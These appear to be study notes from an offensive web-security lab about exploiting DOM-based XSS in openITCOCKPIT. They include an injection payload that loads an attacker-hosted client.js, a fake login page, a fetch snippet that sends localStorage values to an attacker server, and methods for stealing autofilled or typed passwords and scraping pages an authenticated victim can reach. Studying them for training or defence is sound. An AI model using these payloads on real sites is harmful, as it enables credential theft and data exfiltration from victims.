# DOM-based XSS

When a browser interprets an HTML page, it renders individual HTML elements in a hierarchical tree known as the Document Object Model, or DOM. DOMs allow for programmatic manipulation of a page via JavaScript from a client’s browser, for instance background tasks and UI changes. JavaScript implements the Document interface which allows us to query and reference objects in the DOM. It then allows for direct writing to the DOM via the `write` method. 

## XSS Objectives

1. When a user logs into a web application, a session is created and stored in cookies.
2. When we send a link that references malicious Javascript, we’ll be able to redirect the user and use their cookies to obtain information. 
3. This malicious script will grab any cookies, local storage and session data and exfiltrate back to our C2 Server
4. Our malicious script will spawn an `iframe`directed at the main page. From there, it can perform web scraping to look for any accessible URLs, fetch the page content, and exfiltrate back to our server. 

DOM-based XSS occurs if unsensitized user input is provided to a property, like `innerHTML` or a method like `write`. For instance, in this code segment, we could append `?name=<script>alert(1)</script>"` to the URL, which results in the browser executing malicious JavaScript code. 

```html
<!DOCTYPE html>
<html>
<head>
 <script>
 const queryString = location.search; const urlParams = new URLSearchParams(queryString);
 const name = urlParams.get('name')
 document.write('<h1>Hello, ' + name + '!</h1>');
 </script>
</head>
</html>
```

DOM-based XSS can also be stored if the value appended to the DOM is obtained from a user-controlled database value. 

## XSS Hunting

We start searching for DOM-based XSS by searching for references to the document object. The most straightforward one of these is the `document.write` function.

```bash
grep -r "document.write" . --include *.html
```

![Untitled](DOM-based%20XSS%2093f096fc920441d28a4c34cb897b2b71/Untitled.png)

This suggests there could be a possible XSS injection point at `http://openitcockpit/js/lodash/perf/index.html`.

The above invocations of `document.write` use either the `ui.buildPath` or `ui.otherPath` variables. If either of these variables are user-controlled, we’ll be able to inject custom input into the `document.write` function. As such, we’ll search for where these functions are defined (which would take the format `buildPath =` xxxxx. 

```bash
grep -r "buildPath\s*=" . 
```

A `switch` statement returns the value of the `build` value as long as no other condition is true. The `build` variable is set at the beginning of the file and is obtained from [`location.search`](http://location.search), which is parsed using regex. As such, we’ll want to set the `location.search` value (which is the query portion of a URL, including the question mark) to be equal to `build="><script>alert(1)</script><script src="` 

```jsx
/** The lodash build to load. */
  var build = (build = /build=([^&]+)/.exec(location.search)) && decodeURIComponent(build[1]);

// The lodash build file path.
  ui.buildPath = (function() {
    var result;
    switch (build) {
      case 'lodash-compat':     result = 'lodash.compat.min.js'; break;
      case 'lodash-custom-dev': result = 'lodash.custom.js'; break;
      case 'lodash-custom':     result = 'lodash.custom.min.js'; break;
      case null:                build  = 'lodash-modern';
      case 'lodash-modern':     result = 'lodash.min.js'; break;
      default:                  return build;
    }
    return basePath + result;
  }());
```

```jsx

```

## XSS Exploitation

A reflected DOM-based XSS vulnerability provides limited opportunities

1. First, it requires a victim to exploit. Unlike stored XSS, we have to craft a specific link and send it to a victim. The XSS will trigger when the victim visits the page.
2. It’s also important to note XSS only runs while the victim has the window open, and thus we want the XSS to run as quickly as possible.

When we inspect our requests, we notice a cookie named `itnovum`. Since we don’t have credentialed access, we can assume that it's used for session management. The cookie also has the `HTTPOnly`flag set (which can be seen under developer tools). This means we can’t access the user’s session cookie using XSS, and thus can’t use that vector to gain authentication.

Instead, we have access to the DOM and can control what is loaded and rendered on the webpage with XSS. When a user’s browser requests content from a web page, the browser automatically includes the session cookie in the request, even if JS does not have direct access to the cookie value. This means we can add content to the DOM via XSS to **load resources only accessible** by authenticated users.  

- While JS has access to manipulate the DOM, the browser sets restrictions to what JS has access to via Same-Origin Policy.
- The SOP allows different pages from the same origin to communicate and share resources. This means that we can load **any page from the same source** and retrieve its contents.
- As such, we can use XSS to scrape the home page that our authenticated victim has access to

## Building application

The application would consist of:

1. XSS Payload script, that renders a convincing enough page to ensure the victim won’t leave the page
2. SQLite database to store collected content and re-create remote HTML files locally
3. Flask API Server to receive content from the XSS payload. 
4. The database script must be written to be imported and used in multiple scripts. 

In order to display a convincing page, we can override the body’s or HTML’s innerHTML to be our custom payload. 

```jsx
document.getElementsByTagName("body")[0].innerHTML = "<h1> Magic! </h1>" 
```

We can replicate the login page by using `wget` to download the static HTML content, and then using `document.getElementsByTagName("html")[0].innerHTML = body` to replace the HTML. 

### Extra Mile 10.6.2.2

*Change the form of the fake login page to prevent the form from loading a new page.* 

We can use the HTML attribute `onsubmit="return false"` on the form element to prevent the form from returning a response and loading a new page. This will help slow down the user form being redirected away from the page. 

[How to prevent buttons from submitting forms in HTML ? - GeeksforGeeks](https://www.geeksforgeeks.org/how-to-prevent-buttons-from-submitting-forms-in-html/)

## Database and WebServer

We need a system of capturing and storing data (both user input and data obtained from victim’s session). We can use an SQLite database to store our data. 

Our script should have 4 main arguments: Database creation, content insertion, get content, and to list the URL the content was obtained from. 

Once we’ve done this, we can write a Flask wrapper around our database so that our XSS script can exfiltrate data to a webserver. 

In particular, `CORS(app)` sets the CORS header to accept connections from any domain, allowing for cross-origin network connections. Since openITCOCKPIT runs on HTTPS, modern browsers will block mixed requests from HTTPS to HTTP. As such, we run the Flask application on port 443, and generate a self-signed certificate and key. 

```bash
openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout 
key.pem -days 365
```

Additionally, we can rework our XSS injection to reference our `client.js` file on our webserver instead of having to manually insert the JS code ourselves. 

### Exercise 10.6.4.1

*Exploit the XSS discovered earlier but this time use `https://<Your Kali IP>/client.js` as the
payload. If successful, the XSS should display the fake Login page.*

```python
payload = "\"></script><script src=\"https://{ip}:443/client.js\"></script><script src=\""
```

### Extra Mile 10.6.4.2

Gets all values from localStorage

```jsx
setTimeout(() => {
    Object.keys(localStorage).forEach(key => {
        fetch("https://<ip>/save_cookies", {
            body: "name=" + encodeURIComponent(key) + "&value=" + encodeURIComponent(localStorage.getItem(key)),
            headers: {"Content-Type": "application/x-www-form-urlencoded"},
            method: "POST"
        });
    })
}, 2000); // Leave time for page to load
```

## Scraping Content

Need to finish `client.js` script to target the authenticated victim and scrape the data they have access to. The script needs to:

1. Load the home page
2. Search for all unique links and save their HREFs
3. Fetch the content of each link
4. Send the obtained content from each link to our API server. 

We will use an `iframe` to load the page, follow any redirects, and render any JS. Once the page is fully loaded, we can grab all the links the authenticated user has access to. 

- We don’t want to follow a link that will log out of the current session, so we avoid any links that contains the words `logout, log-out, signout or sign-out`
- We want to make sure that any URL that we consider is a valid URL. We should perform a `fetch` to verify each link, but we should use a promise to run the request **asynchronously**, ensuring that the request won’t freeze up the user’s browser.
- Need to make sure we don’t scrape links before the page is loaded, since openITCOCKPIT loads a lot of JS and the JS could load additional content.

### Extra Mile 10.6.5.2

*Capture any pre-filled passwords the user has saved in their browser. Send the captured
credentials to the API Server.*

Source: https://gosecure.ai/blog/2022/06/29/did-you-know-your-browsers-autofill-credentials-could-be-stolen-via-cross-site-scripting-xss/

The web browser looks for username and password fields within a form to automatically fill. We simply add custom IDs to the HTML in the form, and then use JavaScript to exfiltrate the credentials via HTTP. 

*Capture Login Events if the user we are targeting types in their credentials and clicks “Sign
in”. Send the captured credentials to the API Server. This can also be done by creating a
JavaScript keylogger.*

From the previous section, we can just add an `onclick` event on the submit button. Together with the earlier functionality that overrides the form’s submit functionality, the user will be stuck at this page while our XSS script can exfiltrate credentials. 

*The longer the user is on this page, the more data we can obtain from them. Devise a
technique to keep the user on the page longer*

We can add a little spinning wheel to run for a few seconds when the page loads (generated with my Gemini Advanced account :). The code adds the `spinnercontainer` div into body, and after a few seconds, will remove the div to return the page to normal. 

## Content Dumping

Once we’ve acquired a database of content from an authenticated user, we need to dump this data into easily managed files. The following code helps to create any relevant directories and create the filepath of each of the HTML files captured in our SQLite database. 

```python
def write_to_file(url, content):
	fileName = url.replace('https://', '')
	if not fileName.endswith(".html"):
		fileName += ".html"
	fullname = os.path.join(contentDir, fileName)
	path, basename = os.path.split(fullname)
	if not os.path.exists(path):
		os.makedirs(path)
	with open(fullname, 'w') as f:
		f.write(content)
```
